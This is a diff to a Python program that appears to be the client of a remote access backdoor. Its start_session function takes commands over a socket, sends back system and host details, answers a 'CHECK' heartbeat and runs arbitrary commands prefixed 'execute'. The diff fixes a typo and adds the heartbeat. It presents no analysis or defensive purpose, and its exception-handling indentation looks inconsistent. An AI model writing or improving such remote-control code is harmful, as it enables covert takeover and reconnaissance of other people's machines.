@@ -13,13 +13,16 @@ def start_session(s):
             if "OS" in cmd:
                 os_name = platform.system()
                 os_processor = platform.processor()
-                os_info = platform.platfrom()
+                os_info = platform.platform()
                 os_user = platform.node()
                 details = "Operating System : %s\n"%(str(os_name))
                 details += "Processor : %s\n"%(str(os_processor))
                 details += "Version : %s\n"%(str(os_info))
                 details += "User(node) : %s\n"%(str(os_user))
                 s.send(details.encode())
+
+            if "CHECK" in cmd:
+                s.send("YES".encode())
 
             if "execute" in cmd:
                 cmd = cmd.strip("execute ")
@@ -29,7 +32,7 @@ def start_session(s):
         #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
         #    if "execute" in cmd:
         #        cmd = cmd.strip("execute ")
-    except Exception as e:
+        except Exception as e:
             print(str(e))
 
 def main():
